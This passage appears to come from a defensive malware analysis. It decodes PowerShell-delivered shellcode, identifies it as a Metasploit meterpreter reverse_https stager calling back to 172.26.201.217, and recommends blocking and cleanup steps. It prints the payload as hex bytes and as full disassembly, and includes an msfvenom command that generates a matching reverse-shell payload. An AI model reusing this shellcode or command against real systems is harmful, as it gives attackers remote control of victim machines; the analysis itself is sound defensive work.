B5 A2 56 FF D5 6A 40 68 00 10 00 00 68 00 00 40 00 53 68 58 A4 53 E5 FF D5 93 53 53 89 E7 57 68 00 20 00 00 53 56 68 12 96 89 E2 FF D5 85 C0 74 CD 8B 07 01 C3 85 C0 75 E5 58 C3 5F E8 69 FF FF FF 31 37 32 2E 32 36 2E 32 30 31 2E 32 31 37 00
```

This hex will decode to the following:
```
üè���`‰å1Òd‹R0‹R 
‹R  ·J&‹r(1ÿ1À¬<a| , ÁÏ
 ÇIuïR‹R W‹B< Ð‹@x…ÀtL Ð‹X  Ó‹H P…Ét<1ÿI‹4‹ Ö1ÀÁÏ
¬ Ç8àuô }ø;}$uàX‹X$ Óf‹ 
K‹X  Ó‹ ‹ Ð‰D$$[[aYZQÿàX_Z‹ é€ÿÿÿ]hnet�hwiniThLw&ÿÕ1ÛSSSSSh:Vy§ÿÕSSj SShû ��è°���/qcWKi504f1v_Sf5In67TPgvtT3QWB�PhW‰ŸÆÿÕ‰ÆSh�2è„SSSWSVhëU.;ÿÕ–j
_h€3��‰àj Pj¬VhuFž†ÿÕSSSSVh-  {ÿÕ…Àu hˆ ��hDð5àÿÕOuÍhðµ¢VÿÕj@h� ��h��@�ShX¤SåÿÕ“SS‰çWh� ��SVh –‰âÿÕ…ÀtÍ‹ Ã…ÀuåXÃ_èiÿÿÿ172.26.201.217�
```

Now we can get a little bit of info from this (the C2 IP), but lets make it a little cleaner by removing all obfuscated characters.

Save the decoded section to a text file then run strings on it:

```
strings hexdecode.txt
```

Nice, now we can recognize a few characteristics about this:

```
;}$u
D$$[[aYZQ
]hnet
hwiniThLw&
SSSSSh:Vy
/qcWKi504f1v_Sf5In67TPgvtT3QWB
SSSWSVh
VhuF
SSSSVh-
172.26.201.217
```

Immediately, we are able to see the private IP that this attempts to establish a reverse connection with for the shell (172.26.201.217).

Now, we have two options... we can take a look deeper into this shellcode using the open source tool, [radare2](https://github.com/radareorg/radare2) or we can do some OSINT on these strings to see if they used any further encoding or if we can find it due to the payload being common.

I always like to start with OSINT because it might give me some information I can use during my reverse engineering.

I'm going to begin with some google dorking of these strings (really just need to add "" around the strings for these).

1. ;}$u - this string I don't think will be of use googling because it doesn't contain very many characters.
1. "D$$[[aYZQ" - this string hints towards meterpreter.
1. ]hnet - this won't help googling, but this string hints with the next string that this involves wininet.dll likely for http.
1. "hwiniThLw&" - this one helps us stumble upon [something](https://github.com/rapid7/metasploit-framework/issues/10629) that will help back our suspicions.

I think we've got enough for our hypothesis here, let's take this info we got from OSINT and test the windows/meterpreter/reverse_https for similarities.

```
msfvenom -p windows/meterpreter/reverse_https -a x86 LHOST=172.26.201.217 LPORT=443 R | strings
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 541 bytes

;}$u
D$$[[aYZQ
]hnet
hwiniThLw&
SSSSS
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
h:Vy
/9pWDo7fgGsA8kj2TXGkMGgriBE7F7zNDRv1A_YBPeRafEH2_2WjLpfZ5UkFvRMkyTEMh6iBxKP_2F7a2XcB_ydDaN0VSH8aI-XJL
SSSWSVh
VhuF
SSSSVh-
172.26.201.217
```

Now we compare the two:

```
Decoded Hex (powershell payload)     Our msfvenom payload
;}$u                                 identical
D$$[[aYZQ                            identical
]hnet                                identical
hwiniThLw&                           identical
SSSSSh:Vy                            SSSSS
/qcWKi504f1v_Sf5In67TPgvtT3QWB       Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
SSSWSVh                              h:Vy (this would be identical if not a line in the middle for the user agent)
VhuF                                 /MGgriBE7F7zNDRv1A_YBPeRafEH2 (random string is used here)
SSSSVh-                              SSSWSVh
172.26.201.217                       VhuF
                                     SSSSVh-
                                     172.26.201.217
```

From our investigation, we can conclude that this is a [windows/meterpreter/reverse_https](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/payload/windows/meterpreter/reverse_https.md#:~:text=windows%2Fmeterpreter%2Freverse_https%20is%20a,it%20talks%20to%20the%20attacker.) x86 shellcode payload because the only difference in the hex strings was the user agent included in the msfvenom one we created. Since they are using a meterpreter shell, we know they will be using Metasploit as their C2 to listen for the connection.

This is likely due to a different payload creation with "HttpUserAgent=", as I used the default.

## windows/meterpreter/reverse_https

**Why https and not tcp?**
1. Evasion - Firewalls usually allow http/https traffic and would be more likely to block tcp. Along with this, the wininet API that we see that it used can allow an adversary to use proxy/auth settings set up for Internet access.
2. Persistence - If the target loses internet/connectivity, it will attempt to reconnect with the attack source.

## Recommendations

1. Remove 172.26.201.217 from the network.
2. Review other devices for connection with this IoC IP.
3. Block 172.26.201.217 in the firewall.
4. Locate the source of the powershell and clean the device (maldoc, etc).

Raw dump for deeper look at the shellcode from the powershell and windows/meterpreter/reverse_http [block api](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_http.asm):

```
0:  fc                      cld
1:  e8 8f 00 00 00          call   0x95
6:  60                      pusha
7:  89 e5                   mov    ebp,esp
9:  31 d2                   xor    edx,edx
b:  64 8b 52 30             mov    edx,DWORD PTR fs:[edx+0x30]
f:  8b 52 0c                mov    edx,DWORD PTR [edx+0xc]
12: 8b 52 14                mov    edx,DWORD PTR [edx+0x14]
15: 0f b7 4a 26             movzx  ecx,WORD PTR [edx+0x26]
19: 8b 72 28                mov    esi,DWORD PTR [edx+0x28]
1c: 31 ff                   xor    edi,edi
1e: 31 c0                   xor    eax,eax
20: ac                      lods   al,BYTE PTR ds:[esi]
21: 3c 61                   cmp    al,0x61
23: 7c 02                   jl     0x27
25: 2c 20                   sub    al,0x20
27: c1 cf 0d                ror    edi,0xd
2a: 01 c7                   add    edi,eax
2c: 49                      dec    ecx
2d: 75 ef                   jne    0x1e
2f: 52                      push   edx
30: 8b 52 10                mov    edx,DWORD PTR [edx+0x10]
33: 57                      push   edi
34: 8b 42 3c                mov    eax,DWORD PTR [edx+0x3c]
37: 01 d0                   add    eax,edx
39: 8b 40 78                mov    eax,DWORD PTR [eax+0x78]
3c: 85 c0                   test   eax,eax
3e: 74 4c                   je     0x8c
40: 01 d0                   add    eax,edx
42: 8b 58 20                mov    ebx,DWORD PTR [eax+0x20]
45: 01 d3                   add    ebx,edx
47: 8b 48 18                mov    ecx,DWORD PTR [eax+0x18]
4a: 50                      push   eax
4b: 85 c9                   test   ecx,ecx
4d: 74 3c                   je     0x8b
4f: 31 ff                   xor    edi,edi
51: 49                      dec    ecx
52: 8b 34 8b                mov    esi,DWORD PTR [ebx+ecx*4]
55: 01 d6                   add    esi,edx
57: 31 c0                   xor    eax,eax
59: c1 cf 0d                ror    edi,0xd
5c: ac                      lods   al,BYTE PTR ds:[esi]
5d: 01 c7                   add    edi,eax
5f: 38 e0                   cmp    al,ah
61: 75 f4                   jne    0x57
63: 03 7d f8                add    edi,DWORD PTR [ebp-0x8]
66: 3b 7d 24                cmp    edi,DWORD PTR [ebp+0x24]
69: 75 e0                   jne    0x4b
6b: 58                      pop    eax
6c: 8b 58 24                mov    ebx,DWORD PTR [eax+0x24]
6f: 01 d3                   add    ebx,edx
71: 66 8b 0c 4b             mov    cx,WORD PTR [ebx+ecx*2]
75: 8b 58 1c                mov    ebx,DWORD PTR [eax+0x1c]
78: 01 d3                   add    ebx,edx
7a: 8b 04 8b                mov    eax,DWORD PTR [ebx+ecx*4]
7d: 01 d0                   add    eax,edx
7f: 89 44 24 24             mov    DWORD PTR [esp+0x24],eax
83: 5b                      pop    ebx
84: 5b                      pop    ebx
85: 61                      popa
86: 59                      pop    ecx
87: 5a                      pop    edx
88: 51                      push   ecx
89: ff e0                   jmp    eax
8b: 58                      pop    eax
8c: 5f                      pop    edi
8d: 5a                      pop    edx
8e: 8b 12                   mov    edx,DWORD PTR [edx]
90: e9 80 ff ff ff          jmp    0x15
95: 5d                      pop    ebp
96: 68 6e 65 74 00          push   0x74656e - Push the bytes 'wininet' on the stack.
9b: 68 77 69 6e 69          push   0x696e6977 - continued
a0: 54                      push   esp - Push a pointer to the "wininet" string on the stack.
a1: 68 4c 77 26 07          push   0x726774c - hash( "kernel32.dll", "LoadLibraryA" )
a6: ff d5                   call   ebp - LoadLibraryA( "wininet" )
a8: 31 db                   xor    ebx,ebx
aa: 53                      push   ebx
ab: 53                      push   ebx
ac: 53                      push   ebx
ad: 53                      push   ebx
ae: 53                      push   ebx
af: 68 3a 56 79 a7          push   0xa779563a - hash( "wininet.dll", "InternetOpenA" )
b4: ff d5                   call   ebp
b6: 53                      push   ebx
b7: 53                      push   ebx
b8: 6a 03                   push   0x3
ba: 53                      push   ebx
bb: 53                      push   ebx
bc: 68 fb 20 00 00          push   0x20fb
c1: e8 b0 00 00 00          call   0x176
c6: 2f                      das
c7: 71 63                   jno    0x12c
c9: 57                      push   edi
ca: 4b                      dec    ebx
cb: 69 35 30 34 66 31 76    imul   esi,DWORD PTR ds:0x31663430,0x66535f76
d2: 5f 53 66
d5: 35 49 6e 36 37          xor    eax,0x37366e49
da: 54                      push   esp
db: 50                      push   eax
dc: 67 76 74                addr16 jbe 0x153
df: 54                      push   esp
e0: 33 51 57                xor    edx,DWORD PTR [ecx+0x57]
e3: 42                      inc    edx
e4: 00 50 68                add    BYTE PTR [eax+0x68],dl
e7: 57                      push   edi
e8: 89 9f c6 ff d5 89       mov    DWORD PTR [edi-0x762a003a],ebx
ee: c6                      (bad)
ef: 53                      push   ebx
f0: 68 00 32 e8 84          push   0x84e83200
f5: 53                      push   ebx
f6: 53                      push   ebx
f7: 53                      push   ebx
f8: 57                      push   edi
f9: 53                      push   ebx
fa: 56                      push   esi
fb: 68 eb 55 2e 3b          push   0x3b2e55eb
100:    ff d5                   call   ebp
102:    96                      xchg   esi,eax
103:    6a 0a                   push   0xa
105:    5f                      pop    edi
106:    68 80 33 00 00          push   0x3380
10b:    89 e0                   mov    eax,esp
10d:    6a 04                   push   0x4
10f:    50                      push   eax
110:    6a 1f                   push   0x1f
112:    56                      push   esi
113:    68 75 46 9e 86          push   0x869e4675
118:    ff d5                   call   ebp
11a:    53                      push   ebx
11b:    53                      push   ebx
11c:    53                      push   ebx
11d:    53                      push   ebx
11e:    56                      push   esi
11f:    68 2d 06 18 7b          push   0x7b18062d
124:    ff d5                   call   ebp
126:    85 c0                   test   eax,eax
128:    75 16                   jne    0x140
12a:    68 88 13 00 00          push   0x1388
12f:    68 44 f0 35 e0          push   0xe035f044
134:    ff d5                   call   ebp
136:    4f                      dec    edi
137:    75 cd                   jne    0x106
139:    68 f0 b5 a2 56          push   0x56a2b5f0
13e:    ff d5                   call   ebp
140:    6a 40                   push   0x40
142:    68 00 10 00 00          push   0x1000
147:    68 00 00 40 00          push   0x400000
14c:    53                      push   ebx
14d:    68 58 a4 53 e5          push   0xe553a458
152:    ff d5                   call   ebp
154:    93                      xchg   ebx,eax
155:    53                      push   ebx
156:    53                      push   ebx
157:    89 e7                   mov    edi,esp
159:    57                      push   edi
15a:    68 00 20 00 00          push   0x2000
15f:    53                      push   ebx
160:    56                      push   esi
161:    68 12 96 89 e2          push   0xe2899612
166:    ff d5                   call   ebp
168:    85 c0                   test   eax,eax
16a:    74 cd                   je     0x139
16c:    8b 07                   mov    eax,DWORD PTR [edi]
16e:    01 c3                   add    ebx,eax
170:    85 c0                   test   eax,eax
172:    75 e5                   jne    0x159
174:    58                      pop    eax
175:    c3                      ret
176:    5f                      pop    edi
177:    e8 69 ff ff ff          call   0xe5
17c:    31 37                   xor    DWORD PTR [edi],esi
17e:    32 2e                   xor    ch,BYTE PTR [esi]
180:    32 36                   xor    dh,BYTE PTR [esi]
182:    2e 32 30                xor    dh,BYTE PTR cs:[eax]
185:    31 2e                   xor    DWORD PTR [esi],ebp
187:    32 31                   xor    dh,BYTE PTR [ecx]
189:    37                      aaa
```
